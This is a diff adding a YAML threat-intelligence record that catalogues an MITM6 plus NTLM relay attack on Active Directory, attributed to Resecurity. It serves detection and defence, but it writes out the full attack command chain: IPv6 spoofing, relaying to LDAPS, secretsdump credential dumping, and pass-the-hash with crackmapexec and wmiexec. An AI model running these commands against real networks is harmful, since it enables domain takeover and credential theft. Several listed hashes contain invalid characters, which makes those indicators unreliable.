@@ -1,0 +1,63 @@
+description: MITM6 + NTLM Relay attack exploits IPv6 auto-configuration to compromise
+  Active Directory environments.
+attribution:
+- Resecurity
+malware_families:
+- mitm6
+- ntlmrelayx
+TTPs:
+  processes:
+  - mitm6
+  - impacket-ntlmrelayx
+  - secretsdump.py
+  - crackmapexec
+  - wmiexec.py
+  commandline:
+  - sudo mitm6 d target.local --no-ra
+  - sudo impacket-ntlmrelayx ts 6 -t ldaps://target.local -wh fakewpad add-computer
+    delegate-access
+  - secretsdump.py target.local/User:Password@target.local
+  - crackmapexec smb 10.0.0.1/8 -u administrator H 1f937b21e2e0ada0d3d3f7cf58c8aade
+    share
+  - crackmapexec smb 10.0.0.1/8 -u ADmanager H 1f937b27yt60ada0d3d3f7cf58c8aade share
+  - crackmapexec smb 10.0.0.1/8 -u KESadmin H 3k9i7b21e2e0ada0d3d3f7cf58c8vdde share
+  - crackmapexec smb 10.0.0.1/8 -u sqladmin H 1f97yf4de2e0ada0d3d3f7cf58c8aade share
+  - wmiexec target.local/Administrator@192.168.10.3 -no-pass hashes aad3b435b51404eeaad3b435b51536ee:1f937b56ihe0ada02edf377yr8c8aade
+  - wmiexec target.local/KESadmin@192.168.10.3 -no-pass hashes aad3b876b51404zzaad3b435b5gt23ee:1f937b6se2e0ad6y2edf37cf58c8aade
+  - wmiexec target.local/sqladmin@192.168.10.3 -no-pass hashes aad3b435b51404eeaad3b435b5yh23ee:1f937b53e2e0ada0265f37cf58c8aade
+  powershell:
+  - ''
+  scripting_engine:
+  - ''
+  registry_keys:
+  - ''
+  image_load:
+  - ''
+  network_connections:
+  - mitm6: target.local
+  - impacket-ntlmrelayx: ldaps://target.local
+  - secretsdump.py: target.local
+  - crackmapexec smb: 10.0.0.1/8
+  - wmiexec: 192.168.10.3
+  file_activity:
+  - ''
+  persistence:
+  - ''
+  pipes:
+  - ''
+  process_relations:
+  - mitm6 -> impacket-ntlmrelayx -> secretsdump.py -> crackmapexec -> wmiexec.py
+IOCs:
+- 1f937b21e2e0ada0d3d3f7cf58c8aade
+- 1f937b27yt60ada0d3d3f7cf58c8aade
+- 3k9i7b21e2e0ada0d3d3f7cf58c8vdde
+- 1f97yf4de2e0ada0d3d3f7cf58c8aade
+- target.local
+- ldaps://target.local
+- 10.0.0.1/8
+- 192.168.10.3
+authors:
+- Resecurity
+reference: https://www.resecurity.com/blog/article/mitm6-ntlm-relay-how-ipv6-auto-configuration-leads-to-full-domain-compromise
+date_of_publication: August 20, 2025
+file_creation_date: August 21, 2025
